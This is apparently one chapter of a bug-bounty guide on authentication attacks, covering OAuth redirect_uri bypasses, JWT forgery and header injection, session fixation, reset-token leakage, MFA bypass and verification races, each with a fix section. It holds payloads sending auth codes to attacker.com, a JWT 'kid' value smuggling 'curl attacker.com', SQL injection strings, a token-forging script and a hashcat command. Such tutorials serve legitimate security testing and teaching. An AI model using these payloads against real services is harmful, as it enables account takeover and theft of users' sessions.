# 🔐 Auth & Session (Tricks #24–#29)

> ⚠️ **Disclaimer:** Educational use only. Only test in-scope assets you are
> authorized to test. Never touch systems without explicit written permission.

Auth bugs are the fastest path to Critical severity because they directly
enable **account takeover (ATO)**. These tricks cover OAuth, JWT, session
handling, password reset, and MFA bypass — the highest-impact bugs in modern
web apps.

---

## Table of Contents

1. [OAuth redirect_uri Bypass via Path Traversal](#trick-24)
2. [JWT alg:none + Key Confusion Attacks](#trick-25)
3. [Session Fixation via Pre-Auth Cookies](#trick-26)
4. [Password Reset Token Leakage via Referer](#trick-27)
5. [Bypass MFA with Response Manipulation](#trick-28)
6. [Account Takeover via Email Verification Race](#trick-29)

---

<a name="trick-24"></a>
## 🧩 Trick #24 — OAuth redirect_uri Bypass via Path Traversal

**Category:** Auth / OAuth
**Impact:** Critical (ATO)
**Tools:** Burp, browser

### The Idea
OAuth providers validate `redirect_uri` to prevent token theft. But if the
validation uses weak string matching (starts-with, ends-with, substring), you
can bypass it and receive the auth code on your own server.

### Bypass Techniques

**1. Path traversal:**
```
https://target.com/callback/../attacker
https://target.com/callback/../../attacker.com
https://target.com/callback/%2e%2e/attacker
```

**2. Subdomain tricks:**
```
https://target.com.attacker.com/callback
https://attacker.com#target.com
https://attacker.com?target.com
```

**3. Userinfo tricks:**
```
https://target.com@attacker.com/callback
https://attacker.com\target.com
```

**4. Query param injection:**
```
https://target.com/callback?next=https://attacker.com
https://target.com/callback#@attacker.com
```

**5. Parameter pollution:**
```
?redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com
```

**6. Open redirect chain:**
```
https://target.com/callback?next=https://attacker.com
```
If `/callback` has an open redirect, the OAuth code leaks there.

**7. Wildcards:**
```
https://sub.target.com/callback  (if wildcard is *.target.com)
```
→ find a subdomain takeover to control a valid subdomain.

### Steps

1. **Intercept the OAuth authorize request:**
   ```
   GET /oauth/authorize?client_id=X&redirect_uri=https://target.com/callback&...
   ```

2. **Test each bypass technique.**

3. **Look for reflected auth code** in your listener.

4. **Exchange code for token** → ATO.

### Why It Works
- String-based validation is trivially bypassed.
- Path normalization happens after validation.
- Wildcard subdomains → subdomain takeover → token theft.

### Fix
- **Exact match** on `redirect_uri` (no wildcards, no substrings).
- Normalize the URI **before** validation.
- Reject userinfo (`@`), fragments (`#`), and path traversal.
- Register each allowed URI explicitly.

### References
- [PortSwigger: OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)

---

<a name="trick-25"></a>
## 🧩 Trick #25 — JWT alg:none + Key Confusion Attacks

**Category:** Auth / JWT
**Impact:** Critical
**Tools:** `jwt_tool`, `hashcat`, Burp (JWT Editor)

### The Idea
Two classic JWT attacks:
1. **`alg:none`** — if the server accepts unsigned tokens, forge any payload.
2. **Key confusion** — sign HS256 tokens using the RSA public key as the HMAC
   secret.

### Attack 1 — alg:none

**Original JWT:**
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.SIGNATURE
```

**Forged:**
```
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
```
(Note: trailing dot, no signature)

**Variations:**
```
alg: None
alg: NONE
alg: nOnE
alg: none\n
alg: []
```

### Attack 2 — Key Confusion (RS256 → HS256)

1. **Get the public key** (often at `/jwks.json`, `/.well-known/jwks.json`).

2. **Sign an HS256 token** using the public key as the secret:
   ```bash
   python3 -c "
   import jwt
   pub = open('public.pem','rb').read()
   print(jwt.encode({'sub':'admin'}, pub, algorithm='HS256'))
   "
   ```

3. **Send the HS256 token** — if the server uses the same key for both
   algorithms, verification passes.

### Attack 3 — Weak Secret Cracking

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### Attack 4 — `kid` Header Injection

**Path traversal:**
```
{"alg":"HS256","kid":"../../../../dev/null"}
```
→ sign with empty key.

**SQL injection:**
```
{"alg":"HS256","kid":"key1' UNION SELECT 'attacker_secret'--"}
```

**Command injection:**
```
{"alg":"HS256","kid":"key1|curl attacker.com"}
```

### Attack 5 — JKU / X5U Injection

```
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}
```
→ server fetches your JWKS → you sign with your own key.

### Attack 6 — JWK Header Injection

```
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```
→ embed your own public key in the header.

### Steps

1. **Decode the JWT.** Check:
   - `alg` value
   - `kid` handling
   - `jku` / `x5u` / `jwk` support

2. **Try `alg:none` first** (fastest win).

3. **Try key confusion** if public key is available.

4. **Crack weak secrets** with hashcat.

5. **Test `kid` injection** if `kid` exists.

### Why It Works
- Libraries trust the `alg` header.
- Some libraries accept `none`.
- Public/private key confusion is a well-known library bug.
- `kid` is used in file paths / queries → injection.

### Fix
- **Pin the algorithm server-side** — never trust `alg` from the token.
- Reject `none`.
- Use different keys for signing and verification.
- Validate `kid` against a known key set.
- Disable `jku`, `x5u`, `jwk` unless strictly needed.
- Use strong random secrets (≥256 bits).

### References
- [PortSwigger: JWT attacks](https://portswigger.net/web-security/jwt)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)

---

<a name="trick-26"></a>
## 🧩 Trick #26 — Session Fixation via Pre-Auth Cookies

**Category:** Auth / Session
**Impact:** High
**Tools:** Burp, browser DevTools

### The Idea
If the session ID doesn't rotate on login, an attacker can **fix** a known
session ID in the victim's browser, wait for them to log in, then reuse the
same session ID — hijacking the authenticated session.

### Steps

1. **Get a pre-auth session:**
   ```
   GET /login
   → Set-Cookie: SESSION=attacker_known_id
   ```

2. **Force the victim to use that session ID:**
   - URL parameter: `?sessionid=attacker_known_id`
   - Cookie injection via XSS or subdomain
   - Meta refresh with cookie set

3. **Victim logs in** using the fixed session.

4. **Reuse the same session ID** → you're now authenticated as the victim.

### Variations

- **Cookie not rotated** after login
- **Cookie rotated but old one still valid**
- **Multiple cookies accepted** (server picks wrong one)

### Why It Works
- Server doesn't invalidate pre-auth sessions on login.
- Session ID stays the same across auth state change.
- Attacker knows the ID from step 1.

### Fix
- **Rotate session ID on login** (mandatory).
- Invalidate all pre-auth sessions after login.
- Bind session to IP / user agent (with care).
- Use `HttpOnly`, `Secure`, `SameSite=Lax/Strict`.

---

<a name="trick-27"></a>
## 🧩 Trick #27 — Password Reset Token Leakage via Referer

**Category:** Auth
**Impact:** Critical (ATO)
**Tools:** Burp, browser DevTools

### The Idea
Reset emails contain a link like:
```
https://target.com/reset?token=SECRET
```
When the victim clicks it, the page loads third-party resources (analytics,
ads, fonts). The **full URL — including the token — is sent in the `Referer`
header** to those third parties.

### Steps

1. **Trigger a password reset** for your own account.

2. **Open the reset link** in a browser with DevTools → Network.

3. **Look for third-party requests** carrying the `Referer` header:
   - `Referer: https://target.com/reset?token=SECRET`

4. **Any third party** (analytics, CDN) now has your token.

5. **Real attack:**
   - Post a comment / create a profile pointing to your site.
   - Victim views it — but wait, this only works if the victim clicks the reset link while on the attacker-controlled page.
   - The classic vector: **the reset page itself loads a third-party resource the attacker controls** (e.g., a shared CDN bucket, a user avatar URL, an embedded widget).

### Better Attack Path

1. **Find third-party scripts on the reset page** that fetch attacker-controlled URLs:
   - Google Analytics with a custom `client_id`
   - Facebook Pixel with attacker-controlled `event_id`
   - Ad networks

2. **Reset token appears in `Referer`** to that third party.

3. **Attacker who controls the third party** reads the token from logs.

### Why It Works
- Reset tokens are in the URL (not POST body).
- No `Referrer-Policy` header.
- Third-party resources still load on the reset page.

### Fix
- Set `Referrer-Policy: no-referrer` on reset pages.
- Put tokens in POST body or fragment (`#token=...` — not sent in Referer).
- Use one-time, short-lived tokens.
- Verify token on server, then immediately invalidate.

### References
- [MDN: Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)

---

<a name="trick-28"></a>
## 🧩 Trick #28 — Bypass MFA with Response Manipulation

**Category:** Auth / MFA
**Impact:** Critical
**Tools:** Burp

### The Idea
Many apps check the MFA response **client-side**. If the server returns
`{"success":false}` and the client redirects based on that, you can flip it to
`true` in Burp and log in without the code.

### Attack Patterns

**1. Response body manipulation:**
```
Before: {"success":false,"mfa_required":true}
After:  {"success":true,"mfa_required":false}
```

**2. Status code change:**
```
Before: HTTP/1.1 401 Unauthorized
After:  HTTP/1.1 200 OK
```

**3. Redirect bypass:**
```
Before: 302 Location: /mfa?error=invalid
After:  302 Location: /dashboard
```

**4. Missing MFA parameter:**
```
POST /login
user=victim&pass=correct&mfa_code=
```

**5. Same-session bypass:**
- Complete password step → server issues session
- Access `/dashboard` directly without MFA step
- If session already elevated → bypass

**6. Brute force a short code:**
- 6-digit code with no rate limit
- Parallel requests with single-packet attack
- `000000`–`999999` in ~10 seconds

**7. Backup code bypass:**
- Backup codes often weaker
- Reuse after one use

### Steps

1. **Complete password step.**

2. **Intercept the MFA response.**

3. **Try each manipulation:**
   - Change JSON body
   - Change HTTP status
   - Change redirect Location

4. **Check if session is elevated.**

5. **If server-verified**, try brute force / backup codes / direct navigation.

### Why It Works
- Client-side redirect logic is trusted.
- Session elevation is decided on the client.
- Backup codes lack rate limiting.

### Fix
- **Server-side enforcement** — never trust the client.
- Elevate session **only after** server-side MFA verification.
- Rate limit MFA attempts (per-user, per-IP).
- Backup codes: single-use, hashed, rate-limited.

---

<a name="trick-29"></a>
## 🧩 Trick #29 — Account Takeover via Email Verification Race

**Category:** Auth
**Impact:** High
**Tools:** Burp (single-packet attack)

### The Idea
Email verification often uses a check-then-write pattern:
```python
if verification_token.valid:
    user.email = new_email
    verification_token.used = True
```
Race two requests and both pass the check — letting you verify the same
token for **two different users**, or bind your email to a victim's account.

### Attack Scenarios

**1. Double verification:**
- Register with victim's email + your email
- Race the two verification endpoints
- Both succeed → victim's account now attached to your email

**2. Email + account mismatch:**
- Request change to `attacker@evil.com`
- Race with a request for `victim@target.com`
- One confirms the other

**3. Token reuse:**
- Race multiple `/verify?token=X` requests
- Token used more than once

### Steps

1. **Trigger the verification email.**

2. **Capture the verify request:**
   ```
   GET /verify?token=SECRET HTTP/2
   ```

3. **Duplicate 20×, single-packet attack.**

4. **Check:**
   - How many responses say "verified"?
   - Does the token remain valid?
   - Can you verify two accounts with one token?

### Why It Works
- Non-atomic check-then-write.
- Tokens not marked used transactionally.
- No unique constraint on `(user_id, email)`.

### Fix
- **Atomic verify:** `UPDATE tokens SET used=1 WHERE token=? AND used=0` — check `rowcount == 1`.
- Unique constraint on verified emails.
- Expire tokens quickly (15 min).
- Verify + invalidate in one transaction.

---

## 📌 Quick Reference Summary

| #  | Trick                          | Impact   | Effort |
|----|--------------------------------|----------|--------|
| 24 | OAuth redirect_uri bypass      | Critical | Low    |
| 25 | JWT alg:none / key confusion   | Critical | Low    |
| 26 | Session fixation               | High     | Medium |
| 27 | Reset token via Referer        | Critical | Low    |
| 28 | MFA response manipulation      | Critical | Low    |
| 29 | Email verification race        | High     | Medium |

---

> **Prev:** [Client-Side Attacks ←](04-client-side.md)
> **Next:** [Business Logic →](06-business-logic.md)
